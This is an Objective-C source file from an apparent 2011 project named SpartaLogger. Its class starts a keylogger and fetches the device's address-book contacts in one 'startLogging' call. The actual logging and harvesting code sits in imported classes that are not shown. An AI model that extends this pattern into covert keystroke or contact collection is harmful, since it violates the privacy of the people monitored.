//
//  Sparta.m
//  SpartaLogger
//
//  Created by Ryan Gomba on 11/25/11.
//  Copyright (c) 2011 AppThat. All rights reserved.
//

#import "Sparta.h"
#import "KeyLogger.h"
#import "ABParser.h"

@implementation Sparta

@synthesize keyLogger;
@synthesize addressBookParser;

- (id)init
{
    self = [super init];
    if (self) {
        keyLogger = [[[KeyLogger alloc] init] retain];
        addressBookParser = [[[ABParser alloc] init] retain];
    }
    return self;
}

- (void)startLogging
{
    [self.keyLogger startKeyLogger];
    [addressBookParser fetchContacts];
}

@end
